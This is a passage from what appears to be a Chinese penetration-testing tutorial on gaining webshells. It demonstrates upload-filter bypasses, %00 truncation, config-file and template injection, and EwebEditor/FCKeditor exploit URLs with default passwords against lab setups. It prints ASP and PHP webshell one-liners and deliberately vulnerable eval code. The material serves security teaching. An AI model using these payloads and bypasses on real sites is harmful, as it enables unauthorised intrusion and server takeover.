<p>&emsp;&emsp;但是后台配置中却可以设置允许上传的类型，修改加上需要上传的文件类型即可上传该类型文件。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524717762.77614.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524718153.6748862.png" alt=""></p>
<p>&emsp;&emsp;值得一提的是有些上传点的允许上传的文件类型并不是写在后台配置中的，而是写在数据包(URL、COOKIE)中。</p>
<h3 id="前端JS验证"><a href="#前端JS验证" class="headerlink" title="前端JS验证"></a>前端JS验证</h3><p>&emsp;&emsp;前端JS验证，其实就是仅在前端使用JS验证上传文件的类型，而这种验证方法是很容易被绕过的，攻击者只需要修改上传的数据包即可绕过此验证。</p>
<p>&emsp;&emsp;前端JS验证绕过方法的流程图：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524814815.2656598.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器：WIN03+IIS6.0</span><br><span class="line">程序 ： 修改后的DVWA upload/index_.php</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;直接上传.php后缀的文件会被前端的JS代码拦截：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524809647.6361268.png" alt=""></p>
<p>&emsp;&emsp;将一句话木马的后缀修改为允许上传的后缀，上传抓包。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524809870.8850162.png" alt=""></p>
<p>&emsp;&emsp;修改数据包中文件后缀，放行。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524809917.9403367.png" alt=""></p>
<h3 id="服务端拓展名验证"><a href="#服务端拓展名验证" class="headerlink" title="服务端拓展名验证"></a>服务端拓展名验证</h3><p>&emsp;&emsp;除了前端JS验证常见的就是服务端拓展名验证了。前端JS验证可以在验证后的步骤中(数据包)修改文件拓展名，而服务端验证是无法这样绕过的。</p>
<p>&emsp;&emsp;服务器拓展名验证可以配合Windows的命名规则来进行绕过，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test.php.</span><br><span class="line">test.php(空格)</span><br><span class="line">test.php:1.jpg</span><br><span class="line">test.php::$DATA</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;Windows会把不符合规则的部分后面的内容去掉，从而实现绕过服务端拓展名验证GETSHELL。但是这种方法实现的前提是<strong>服务端不会对上传的文件按时间戳重命名</strong>。</p>
<p><strong>案例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序 : BWVS - 服务端扩展名验证实例</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;上传.php后缀的文件，则会显示”此文件不允许上传”：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524891295.491955.png" alt=""></p>
<p>&emsp;&emsp;抓包构造文件名:</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524891471.584162.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524891628.1088245.png" alt=""></p>
<p>&emsp;&emsp;此时upload/shelltest.php就是我们上传上去的WEBSHELL，注意SHELL文件名中那些不符合规则的部分后面内容被去掉了。</p>
<p>&emsp;&emsp;此案例中给出的场景是黑名单验证，但这种绕过方法对于白名单验证同样有效，白名单时构造tony.php:a.jpg即可绕过。</p>
<h3 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h3><p>&emsp;&emsp;MIME验证是通过获取上传文件时数据包中Content-Type的值来判断文件是否合法的。以下是常见图片的后缀和Content-Type对应表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">后缀   Content-Type</span><br><span class="line"></span><br><span class="line">.jpg   image/jpeg</span><br><span class="line">.gif   image/gif</span><br><span class="line">.png   image/png</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;MIME验证只需要攻击者抓取上传数据包，将数据包中的Content-Type的值修改为合法图片的Content-Type值即可绕过。</p>
<p><strong>案例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序： BWVS - MIME限制文件上传</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;上传.php格式的文件，会提示”文件类型不正确，请重新上传！”</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524892498.8708835.png" alt=""></p>
<p>&emsp;&emsp;抓取上传文件的数据包，并修改Content-Type的值</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524892608.2919488.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524892620.191345.png" alt=""></p>
<h3 id="上传内容验证"><a href="#上传内容验证" class="headerlink" title="上传内容验证"></a>上传内容验证</h3><p>&emsp;&emsp;上传内容验证是通过对上传文件的内容进行验证，从而判断上传的文件是否合法。因为jpg、png、bmp、gif格式的图片都有自己固定的文件头，所以常用的上传内容验证方法就是通过验证文件头得出文件的类型。</p>
<p>&emsp;&emsp;常用的绕过方法：</p>
<pre><code>1.在一句话的文件的开头加上gif89a # (gif图片头) 
2.使用合成的图片马
</code></pre><p><strong>案例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序：BWVS - 内容验证实例</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;直接上传仅含有一句话木马的文件，会被判定为非法文件，从而上传失败。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524893155.3945467.png" alt=""></p>
<p>&emsp;&emsp;在一句话木马前面加上gif图片头(gif89a)，再上传。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524893315.1810427.png" alt=""></p>
<p>&emsp;&emsp;或者用合成的图马将后缀改成php上传也是可以的。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524893594.1067827.png" alt=""></p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p>&emsp;&emsp;%00是字符串的结束标识符，00截断就是利用%00来将上传的目录名(或者文件名)截断，只保留下以.php结尾的文件名，从而达到GETSHELL的效果。</p>
<p>&emsp;&emsp;需要注意的是：php&lt;=5.3的才能被00截断，高版本已经修复了该问题。</p>
<p><strong>案例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序：00截断案例 </span><br><span class="line">环境：PHP=5.2.17</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;上传正常的图片：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1525099782.4612617.png" alt=""></p>
<p>&emsp;&emsp;上传php脚本：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1525099828.960782.png" alt=""></p>
<p>&emsp;&emsp;00截断突破：我们可以在数据包中路径后面加上aa.php%00将上传的目录进行截断，在程序中拼接后变成/upload.aa.php%00/xxx.jpg，而%00作为字符串结束符后面的数据就会被忽略掉，从而使上传后的文件变成了uploads/aa.php。</p>
<ul>
<li>第一步：抓取数据包</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1525099905.9303927.png" alt=""></p>
<ul>
<li>第二步：构造%00发送数据包</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1525100022.8427172.png" alt=""></p>
<p>&emsp;&emsp;在路径处加上aa.php%00，然后右击找到urldecode，点击urldecode使%00变成字符串结束符：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1525100131.776224.png" alt=""></p>
<p>&emsp;&emsp;发送数据包：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1525100201.0944922.png" alt=""></p>
<p>&emsp;&emsp;末尾输出结果为包含图片名的原因是：echo可以输出一个或多个字符串，%00作为字符串结束符，其实是把一个字符串分成了两个字符串。</p>
<p>&emsp;&emsp;对%00进行urldecode的原因：发送web请求的时候默认会对提交的数据进行一次url编码，而到服务器端会进行一次urldecode。但是上传表单需要指定enctype=multipart/form-data(对提交的数据不进行编码处理)，而被指定enctype=multipart/form-data的数据到服务端不会进行urldecode，所以我们要手动进行urldecode使%00变成字符串结束符。</p>
<p><strong>案例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序：DVWA文件上传 - High&amp;改版后</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1525102728.8170476.png" alt=""></p>
<p>&emsp;&emsp;案例2中，因为路径存放在cookie中提交数据时会进行一次urlencode，因此不需要对%00进行手动解码，在服务端会对cookie中的path参数的值进行URLdecode操作。</p>
<h3 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h3><p>&emsp;&emsp;双文件上传是同时上传两个文件，第一个文件的后缀名为合法后缀名，第二个文件的后缀名为WEBSHELL后缀，程序只检测第一个文件的后缀名而未对第二个文件的后缀名进行检测，从而实现GETSHELL的上传绕过方法。这种方法常用在”南方数据” CMS中，这里的案例就是”南方数据”的CMS。</p>
<p><strong>案例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序 ： 南方数据</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;抓取上传数据包，从”开始处”复制到”结束处”，然后将复制的内容粘贴在”结束处”的后面。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525106123.7875168.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525106188.8738496.png" alt=""></p>
<p>&emsp;&emsp;找到第二个图片的开始处，<strong>并做两处修改</strong>：1.将name修改为和第一个图片的name不同的值；2.将filename改为.asp空格后缀(不加空格会被拦截)。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525106324.1083055.png" alt=""></p>
<p>&emsp;&emsp;发送数据包：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525106456.6517901.png" alt=""></p>
<h2 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h2><p>&emsp;&emsp;利用数据库备份的方法，将图片马备份成ASP格式的文件，从而GETSHELL。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 演示环境</span></span><br><span class="line"></span><br><span class="line">服务器：win03+IIS6.0</span><br><span class="line">程序 ： 南方数据</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;第一步，上传一个图片马，然后记录下相对路径。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524668046.7075603.png" alt=""></p>
<p>&emsp;&emsp;第二步，数据库备份，将当前数据库地址改为图片马的相对路径</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524667892.583122.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524667996.489649.png" alt=""></p>
<p>&emsp;&emsp;第三步，菜刀连接</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524668250.8996208.png" alt=""></p>
<h2 id="插配置文件"><a href="#插配置文件" class="headerlink" title="插配置文件"></a>插配置文件</h2><p>&emsp;&emsp;有些CMS会将站点的配置信息存放在config.asp[或.php]中，攻击者如果拿到后台后，将构造好的payload改入站点的配置信息，payload即可写入config文件，从而GETSHELL。</p>
<p>&emsp;&emsp;插配置文件GETSHELL的方法是一个细致活，不建议盲插，最好在本地搭建环境测试后再去目标站点使用，否则会导致整个站点崩溃。</p>
<p>&emsp;&emsp;常用的构造此类Payload的方法：闭合前面的引号，注释后面的冗余数据，保证WEBSHELL代码能够被执行。</p>
<p>&emsp;&emsp;案例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器：WIN03+IIS6.0</span><br><span class="line">程序 ： 南方数据</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在网站配置的<strong>网站标题</strong>处插入以下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&gt;&lt;%Eval(Request(chr(112)))%&gt;&lt;%&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524669398.6935449.png" alt=""></p>
<p>&emsp;&emsp;然后用菜刀连接http://域名/inc/config.asp</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524669441.8986375.png" alt=""></p>
<h2 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h2><p>&emsp;&emsp;在渗透测试中，编辑器也很受攻击者的喜爱，编辑器中包含了文章编辑、图片上传和附件上传等功能。而这些编辑器的功能实现代码也可能是存在漏洞的，攻击者可以通过这些漏洞提升自己的权限。下面我们就介绍几款有漏洞的编辑器以及这些编辑器漏洞的利用方法。</p>
<h3 id="EwebEditor"><a href="#EwebEditor" class="headerlink" title="EwebEditor"></a>EwebEditor</h3><p>&emsp;&emsp;EwebEditor是ASP站点中常用的编辑器之一，而该编辑器就存在一些漏洞，允许攻击者上传任意类型文件，从而拿到WEBSHELL。</p>
<p>&emsp;&emsp;EwebEditor常用的后台地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EwebEditor/admin_login.asp</span><br><span class="line">EwebEditor/admin/login.asp</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;EwebEditor使用的数据库是ACCESS数据库，其数据库存放路径为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EwebEditor/db/EwebEditor.mdb</span><br><span class="line">EwebEditor/db/EwebEditor.asp</span><br><span class="line">EwebEditor/db/EwebEditor.asa</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;修改mdb后缀为asp、asa是为了防止数据库被下载后拿到EwebEditor后台的密码。</p>
<p>&emsp;&emsp;EwebEditor后台常用的默认密码：</p>
<table>
<thead>
<tr>
<th>编号</th>
<th>帐号</th>
<th>密码</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>admin</td>
<td>admin</td>
</tr>
<tr>
<td>2</td>
<td>admin</td>
<td>admin888</td>
</tr>
<tr>
<td>3</td>
<td>admin888</td>
<td>admin888</td>
</tr>
</tbody>
</table>
<p>&emsp;&emsp;漏洞利用过程演示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器：WIN03+IIS6.0</span><br><span class="line">程序 ： 注入练习代码</span><br></pre></td></tr></table></figure>
<ul>
<li>获取后台密码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.猜后台密码 (数据库无法下载或密码无法解密时候用)</span><br><span class="line"></span><br><span class="line">2.下载ewebeditor的数据库，查询密码</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524745568.3088872.png" alt=""></p>
<ul>
<li>登陆后台-&gt;样式管理-&gt;修改(新增)样式</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524745749.3704278.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524745786.558375.png" alt=""></p>
<p>&emsp;&emsp;有些站点修改样式中没有提交按钮，只能新增样式，新增样式中需要注意以下两点的填写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.路径模式使用绝对根路径</span><br><span class="line"></span><br><span class="line">2.图片类型添加aaspsp，因为eweb会过滤asp字符串，从而使aaspsp变成asp</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524746092.9103146.png" alt=""></p>
<ul>
<li>为新增后的样式添加按钮</li>
</ul>
<p>&emsp;&emsp;[可选] 如果是修改样式则不需要添加按钮，新增的样式需要添加按钮</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524761613.2290204.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524761655.634534.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524761695.2081523.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524761711.3530457.png" alt=""></p>
<ul>
<li>利用修改(新增)的样式来上传shell</li>
</ul>
<p>&emsp;&emsp;预览修改(新增)的样式，使用上传图片按钮上传WEBSHELL。</p>
<p>&emsp;&emsp;因为存在漏洞的EwebEditor比较老，新版的浏览器无法操作EwebEditor，打开预览以后按钮无法使用，解决此问题可以用IETester打开一个IE6的浏览器，也可以用高版本IE的兼容模式，笔者常用的方法是打开WIN03中的浏览器来进行后续操作。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524761747.7949488.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524761765.5148768.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524761865.391794.png" alt=""></p>
<p>&emsp;&emsp;<strong>小技巧</strong>：在目标站点中随便打开一个含有图片新闻的页面(因为新闻页面中的图片多数是用编辑器上传的)，然后把图片在新标签中打开，观察图片的路径，有时候可以找到编辑器的目录以及判断编辑器的类型。</p>
<h3 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h3><h4 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fckeditor/editor/dialog/fck_about.html</span><br></pre></td></tr></table></figure>
<h4 id="爆绝对路径"><a href="#爆绝对路径" class="headerlink" title="爆绝对路径"></a>爆绝对路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/FCKeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php  # 通杀支持php的</span><br><span class="line"></span><br><span class="line">/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/aspx/connector.aspx</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/shell.asp</span><br></pre></td></tr></table></figure>
<h4 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=../../</span><br><span class="line"></span><br><span class="line">-- 遍历指定目录</span><br><span class="line"></span><br><span class="line">/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/e:/wwwroot/</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/default/browser.html?Type=File&amp;Connector=../../connectors/asp/connector.asp</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</span><br></pre></td></tr></table></figure>
<h4 id="常用的上传地址"><a href="#常用的上传地址" class="headerlink" title="常用的上传地址"></a>常用的上传地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/browser/default/connectors/test.html</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/upload/test.html</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/connectors/test.html</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/connectors/uploadtest.html</span><br></pre></td></tr></table></figure>
<h4 id="突破建立文件夹"><a href="#突破建立文件夹" class="headerlink" title="突破建立文件夹"></a>突破建立文件夹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">editor/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/qing.asp&amp;NewFolderName=x.asp</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z&amp;uuid=1244789975684</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp</span><br></pre></td></tr></table></figure>
<h4 id="FCK上传GETSHELL"><a href="#FCK上传GETSHELL" class="headerlink" title="FCK上传GETSHELL"></a>FCK上传GETSHELL</h4><p><strong>缺实例</strong></p>
<p>&emsp;&emsp;FCK编辑器常配合IIS的解析漏洞来GETSHELL，因为FCK不会对上传后的文件重命名，低版本的FCK可以上传a.asp;.jpg来GetSHELL，有时候会遇到把第一个”.”替换成”_”，可以使用二次上传或者a.asp;jpg来进行绕过。</p>
<p>&emsp;&emsp;FCK还可以建立一个a.asp目录，然后将图片上传到该目录下进行GETSHELL</p>
<h2 id="修改模板文件"><a href="#修改模板文件" class="headerlink" title="修改模板文件"></a>修改模板文件</h2><p>&emsp;&emsp;很多CMS的后台允许用户修改站点的模板文件，攻击者可以利用此功能将恶意代码插入模板文件，从而获取WEBSHELL权限。</p>
<p><strong>案例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序：WordPress 4.6</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在后台的外观处可以编辑主题的模板代码。这里最好选择<code>header.php</code>，因为此处显示的文件都存放在<code>/wp-content/themes/</code>主题名/目录下，编辑其他文件不方便寻找shell，而<code>header.php</code>被站点主页(<code>index.php</code>)所包含，因此主页就是WEBSHELL地址。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525141691.6402144.png" alt=""></p>
<p>&emsp;&emsp;WEBSHELL测试：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525141903.2027836.png" alt=""></p>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>&emsp;&emsp;代码执行漏洞是程序未对用户提交的字符串进行过滤，而直接将字符串当作脚本代码来执行的漏洞。攻击者可以利用代码执行漏洞来执行任意的代码，从而获取WEBSHELL权限。</p>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    第一组测试代码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'We need a code param in url!'</span>))&#123;</span><br><span class="line">		$code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $code;</span><br><span class="line">	<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    第二组测试代码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'We need a code param in post!'</span>))&#123;</span><br><span class="line">		$code = $_POST[<span class="string">'code'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $code;</span><br><span class="line">	<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    第三组测试代码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'code'</span>]) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'We need a code param in Cookie!'</span>))&#123;</span><br><span class="line">		$code = $_COOKIE[<span class="string">'code'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $code;</span><br><span class="line">	<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="执行任意代码"><a href="#执行任意代码" class="headerlink" title="执行任意代码"></a>执行任意代码</h3><p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525318253.4909127.png" alt=""></p>
<p>&emsp;&emsp;三组测试代码的区别只是接受参数的方式不同，这里需要注意的是在数据包中修改了cookie之后要记得对cookie中code参数的值进行一次urlencode，否则分号会被当作Cookie的参数分界符，无法被程序接收。例如：提交<code>code=system(&#39;whoami&#39;);</code>在程序中接收到的却只有<code>system(&#39;whomai&#39;)</code>少了<code>;</code>，而带入eval函数的语句没有语句结束符<code>;</code>则会报错。</p>
<h3 id="构造WEBSHELL"><a href="#构造WEBSHELL" class="headerlink" title="构造WEBSHELL"></a>构造WEBSHELL</h3><p>&emsp;&emsp;对于第一组代码(GET型)可以构造一段payload，使其变成WEBSHELL。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525318497.6862223.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525318535.5373776.png" alt=""></p>
<p>&emsp;&emsp;对于第二组代码(POST型)，其本身就是一个WEBSHELL，可以用菜刀直接连接，密码是接收的参数code。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525318642.3284614.png" alt=""></p>
<p>&emsp;&emsp;对于第三组代码(Cookie型)，就无法直接构造payload来进行连接了。</p>
<h3 id="写文件-1"><a href="#写文件-1" class="headerlink" title="写文件"></a>写文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">'shell.php'</span>,<span class="string">'&lt;?php eval($_POST[x]);?&gt;'</span>);</span><br><span class="line"><span class="comment">// WEBSHELL内容不可以用双引号包裹，否则会解析$_POST[x]变量。</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;此方法在以上三组代码中均适用。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525320197.6837645.png" alt=""></p>
<h3 id="读文件-1"><a href="#读文件-1" class="headerlink" title="读文件"></a>读文件</h3><p>&emsp;&emsp;在CTF中读文件经常被用到，场景如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">代码执行：evalGet.php</span><br><span class="line">目标 ： 读取同目录下flag.php的内容</span><br></pre></td></tr></table></figure>
